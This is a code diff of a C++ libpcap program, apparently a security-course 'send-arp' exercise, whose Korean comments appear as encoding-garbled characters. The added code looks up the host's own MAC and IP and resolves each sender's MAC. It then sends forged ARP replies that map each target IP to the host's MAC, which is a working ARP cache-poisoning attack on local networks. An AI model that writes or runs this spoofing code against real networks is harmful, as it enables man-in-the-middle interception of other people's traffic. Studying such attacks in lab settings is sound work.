@@ -1,71 +1,200 @@
-#include <cstdio>   // Ç¥ÁØ ÀÔÃâ·Â ÇÔ¼ö »ç¿ëÀ» À§ÇÑ Çì´õ ÆÄÀÏ
-#include <pcap.h>   // pcap ¶óÀÌºê·¯¸®¸¦ »ç¿ëÇÏ±â À§ÇÑ Çì´õ ÆÄÀÏ
-#include "ethhdr.h" // ÀÌ´õ³İ Çì´õ Á¤ÀÇ¸¦ À§ÇÑ Ä¿½ºÅÒ Çì´õ ÆÄÀÏ
-#include "arphdr.h" // ARP Çì´õ Á¤ÀÇ¸¦ À§ÇÑ Ä¿½ºÅÒ Çì´õ ÆÄÀÏ
+#include <cstdio>   // í‘œì¤€ ì…ì¶œë ¥ ì‚¬ìš©ì„ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <pcap.h>   // pcap ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©ì„ ìœ„í•œ í—¤ë” íŒŒì¼
+#include "ethhdr.h" // Ethernet í—¤ë” êµ¬ì¡°ì²´ë¥¼ ì •ì˜í•œ ì»¤ìŠ¤í…€ í—¤ë” íŒŒì¼
+#include "arphdr.h" // ARP í—¤ë” êµ¬ì¡°ì²´ë¥¼ ì •ì˜í•œ ì»¤ìŠ¤í…€ í—¤ë” íŒŒì¼
+#include <string>   // ë¬¸ìì—´ ì²˜ë¦¬ë¥¼ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <net/if.h> // ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ê´€ë ¨ êµ¬ì¡°ì²´ë¥¼ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <sys/ioctl.h> // ì…ì¶œë ¥ ì œì–´ë¥¼ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <arpa/inet.h> // IP ì£¼ì†Œ ë³€í™˜ì„ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <unistd.h> // ì‹œìŠ¤í…œ í˜¸ì¶œì„ ìœ„í•œ í—¤ë” íŒŒì¼
+#include <vector> // ë²¡í„° ìë£Œêµ¬ì¡° ì‚¬ìš©ì„ ìœ„í•œ í—¤ë” íŒŒì¼
 
-// ±¸Á¶Ã¼ÀÇ ¸Ş¸ğ¸® Á¤·ÄÀ» 1¹ÙÀÌÆ®·Î ¼³Á¤ (ÆĞµù ¹æÁö)
+// êµ¬ì¡°ì²´ì˜ ë©”ëª¨ë¦¬ ì •ë ¬ì„ 1ë°”ì´íŠ¸ë¡œ ì„¤ì • (íŒ¨ë”© ë°©ì§€)
 #pragma pack(push, 1)
 
-// ÀÌ´õ³İ + ARP ÆĞÅ¶ ±¸Á¶Ã¼ Á¤ÀÇ
+// ì´ë”ë„· + ARP íŒ¨í‚· êµ¬ì¡°ì²´ ì •ì˜
 struct EthArpPacket final {
-	EthHdr eth_; // ÀÌ´õ³İ Çì´õ
-	ArpHdr arp_; // ARP Çì´õ
+	EthHdr eth_; // ì´ë”ë„· í—¤ë”
+	ArpHdr arp_; // ARP í—¤ë”
 };
 
-#pragma pack(pop) // ¸Ş¸ğ¸® Á¤·ÄÀ» ±âº»°ªÀ¸·Î º¹¿ø
+#pragma pack(pop) // ë©”ëª¨ë¦¬ ì •ë ¬ì„ ê¸°ë³¸ê°’ìœ¼ë¡œ ë³µì›
 
-// ÇÁ·Î±×·¥ »ç¿ë¹ıÀ» Ãâ·ÂÇÏ´Â ÇÔ¼ö
+// í”„ë¡œê·¸ë¨ ì‚¬ìš©ë²•ì„ ì¶œë ¥í•˜ëŠ” í•¨ìˆ˜
 void usage() {
 	printf("syntax: send-arp-test <interface>\n");
 	printf("sample: send-arp-test wlan0\n");
 }
 
-// ¸ŞÀÎ ÇÔ¼ö
+// fdëŠ” file descriptor
+char* get_mac_address(const char* iface) {
+    int fd;
+    struct ifreq ifr;
+    char* mac_addr = (char*)malloc(18);  // ë°˜í™˜í•  MAC ì£¼ì†Œë¥¼ ì €ì¥í•  ë™ì  ë©”ëª¨ë¦¬ í• ë‹¹
+    if (mac_addr == NULL) {
+        perror("ë©”ëª¨ë¦¬ í• ë‹¹ ì‹¤íŒ¨");
+        exit(EXIT_FAILURE);
+    }
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd == -1) {
+        perror("socket ìƒì„± ì‹¤íŒ¨");
+        free(mac_addr);  // ë©”ëª¨ë¦¬ í•´ì œ
+        exit(EXIT_FAILURE);
+    }
+
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+
+    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
+        perror("ioctl ìš”ì²­ ì‹¤íŒ¨");
+        close(fd);
+        free(mac_addr);  // ë©”ëª¨ë¦¬ í•´ì œ
+        exit(EXIT_FAILURE);
+    }
+
+    close(fd);
+
+    // MAC ì£¼ì†Œë¥¼ ë¬¸ìì—´ë¡œ ë³€í™˜
+    snprintf(mac_addr, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
+             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
+             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
+             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
+             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
+             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
+             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
+
+    return mac_addr;  // ë™ì  ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œ ë°˜í™˜
+}
+
+char* get_ip_address(const char* iface) {
+    int fd;
+    struct ifreq ifr;
+    char* ip_str = (char*)malloc(INET_ADDRSTRLEN); // IP ì£¼ì†Œë¥¼ ì €ì¥í•  ë™ì  ë©”ëª¨ë¦¬ í• ë‹¹
+    if (ip_str == NULL) {
+        perror("ë©”ëª¨ë¦¬ í• ë‹¹ ì‹¤íŒ¨");
+        exit(EXIT_FAILURE);
+    }
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd == -1) {
+        perror("socket ìƒì„± ì‹¤íŒ¨");
+        free(ip_str);  // ë©”ëª¨ë¦¬ í•´ì œ
+        exit(EXIT_FAILURE);
+    }
+
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+
+    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
+        perror("ioctl ìš”ì²­ ì‹¤íŒ¨");
+        close(fd);
+        free(ip_str);  // ë©”ëª¨ë¦¬ í•´ì œ
+        exit(EXIT_FAILURE);
+    }
+
+    close(fd);
+
+    // IP ì£¼ì†Œë¥¼ ë¬¸ìì—´ë¡œ ë³€í™˜
+    inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), ip_str, INET_ADDRSTRLEN);
+
+    return ip_str;  // ë™ì  ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œ ë°˜í™˜
+}
+
+// ë©”ì¸ í•¨ìˆ˜
 int main(int argc, char* argv[]) {
-	// ÇÁ·Î±×·¥ ÀÎÀÚ ¼ö°¡ ¿Ã¹Ù¸¥Áö È®ÀÎ
-	if (argc != 2) {
-		usage(); // ÀÎÀÚ ¼ö°¡ Æ²¸®¸é »ç¿ë¹ı Ãâ·Â
-		return -1;
-	}
+    if (argc < 4 || (argc % 2) != 0) {
+        usage();
+        return -1;
+    }
 
-	// ³×Æ®¿öÅ© ÀåÄ¡(ÀÎÅÍÆäÀÌ½º) ÀÌ¸§ ÀúÀå
-	char* dev = argv[1];
-	// ¿¡·¯ ¸Ş½ÃÁö¸¦ ÀúÀåÇÒ ¹öÆÛ
-	char errbuf[PCAP_ERRBUF_SIZE];
-	// ÀåÄ¡¸¦ ¿­¾î ¶óÀÌºê ÆĞÅ¶ Ä¸Ã³¸¦ ½ÃÀÛ
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		// ÀåÄ¡¸¦ ¿­ ¼ö ¾øÀ¸¸é ¿¡·¯ ¸Ş½ÃÁö¸¦ Ãâ·ÂÇÏ°í Á¾·á
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
+    char* dev = argv[1];
+    std::vector<Ip> sender_ips;
+    std::vector<Ip> target_ips;
 
-	// ARP ÆĞÅ¶ ±¸Á¶Ã¼ »ı¼º
-	EthArpPacket packet;
+    for (int i = 2; i < argc; i += 2) {
+        sender_ips.push_back(Ip(argv[i]));
+        target_ips.push_back(Ip(argv[i + 1]));
+    }
 
-	// ÀÌ´õ³İ Çì´õ ÇÊµå ¼³Á¤
-	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");  // ¸ñÀûÁö MAC ÁÖ¼Ò
-	packet.eth_.smac_ = Mac("00:00:00:00:00:00");  // Ãâ¹ßÁö MAC ÁÖ¼Ò
-	packet.eth_.type_ = htons(EthHdr::Arp);        // ÀÌ´õ³İ Å¸ÀÔ: ARP
+    // ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ì €ì¥í•  ë²„í¼
+    char errbuf[PCAP_ERRBUF_SIZE];
+    // ì¥ì¹˜ë¥¼ ì—´ì–´ ë¼ì´ë¸Œ íŒ¨í‚· ìº¡ì²˜ë¥¼ ì‹œì‘
+    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+    if (handle == nullptr) {
+        // ì¥ì¹˜ë¥¼ ì—´ ìˆ˜ ì—†ìœ¼ë©´ ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³  ì¢…ë£Œ
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
 
-	// ARP Çì´õ ÇÊµå ¼³Á¤
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);      // ÇÏµå¿ş¾î Å¸ÀÔ: ÀÌ´õ³İ
-	packet.arp_.pro_ = htons(EthHdr::Ip4);        // ÇÁ·ÎÅäÄİ Å¸ÀÔ: IPv4
-	packet.arp_.hln_ = Mac::SIZE;                 // ÇÏµå¿ş¾î ÁÖ¼Ò ±æÀÌ
-	packet.arp_.pln_ = Ip::SIZE;                  // ÇÁ·ÎÅäÄİ ÁÖ¼Ò ±æÀÌ
-	packet.arp_.op_ = htons(ArpHdr::Request);     // ARP ¿ÀÆÛ·¹ÀÌ¼Ç Å¸ÀÔ: ¿äÃ»
-	packet.arp_.smac_ = Mac("00:00:00:00:00:00"); // Ãâ¹ßÁö MAC ÁÖ¼Ò
-	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));      // Ãâ¹ßÁö IP ÁÖ¼Ò
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // ¸ñÀûÁö MAC ÁÖ¼Ò
-	packet.arp_.tip_ = htonl(Ip("0.0.0.0"));      // ¸ñÀûÁö IP ÁÖ¼Ò
+    // ARP íŒ¨í‚· êµ¬ì¡°ì²´ ìƒì„±
+    EthArpPacket packet;
 
-	// ÆĞÅ¶À» ³×Æ®¿öÅ©·Î Àü¼Û
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		// Àü¼Û ½ÇÆĞ ½Ã ¿¡·¯ ¸Ş½ÃÁö Ãâ·Â
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
+    std::string my_mac_str = get_mac_address(dev);
+    std::string my_ip_str = get_ip_address(dev);
 
-	// ³×Æ®¿öÅ© ÀåÄ¡ ÇÚµé ´İ±â
-	pcap_close(handle);
+    Mac my_mac(my_mac_str.c_str());
+    Ip my_ip(my_ip_str.c_str());
+
+    int res;
+
+    // íŒ¨í‚·ì„ ë„¤íŠ¸ì›Œí¬ë¡œ ì „ì†¡
+    for (size_t i = 0; i < sender_ips.size(); ++i) {
+        EthArpPacket packet;
+        packet = EthArpPacket{
+            .eth_ = EthHdr{ Mac("ff:ff:ff:ff:ff:ff"), my_mac, htons(EthHdr::Arp) },
+            .arp_ = ArpHdr{
+                htons(ArpHdr::ETHER),
+                htons(EthHdr::Ip4),
+                Mac::SIZE,
+                Ip::SIZE,
+                htons(ArpHdr::Request),
+                my_mac,
+                htonl(my_ip),
+                Mac("00:00:00:00:00:00"),
+                htonl(sender_ips[i])
+            }
+        };
+
+        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "Error sending ARP request: %d (%s)\n", res, pcap_geterr(handle));
+            pcap_close(handle);
+            return -1;
+        }
+
+        while (true) {
+            struct pcap_pkthdr* header;
+            const u_char* recv_packet;
+            res = pcap_next_ex(handle, &header, &recv_packet);
+            if (res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+                printf("Error capturing packet: %s\n", pcap_geterr(handle));
+                break;
+            }
+
+            EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
+            if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
+                if (recv_etharp->arp_.sip() == sender_ips[i]) {
+                    printf("Received ARP reply from sender. Sender's MAC: %s\n", std::string(recv_etharp->eth_.smac()).c_str());
+                    packet.eth_.dmac_ = recv_etharp->eth_.smac_;
+                    packet.arp_.tmac_ = recv_etharp->eth_.smac_;
+                    break;
+                }
+            }
+        }
+
+        packet.arp_.op_ = htons(ArpHdr::Reply);
+        packet.arp_.sip_ = htonl(target_ips[i]);
+        packet.arp_.tip_ = htonl(sender_ips[i]);
+
+        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "Error sending ARP reply: %d (%s)\n", res, pcap_geterr(handle));
+        }
+    }
+
+    // ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜ í•¸ë“¤ ë‹«ê¸°
+    pcap_close(handle);
+    return 0;
 }
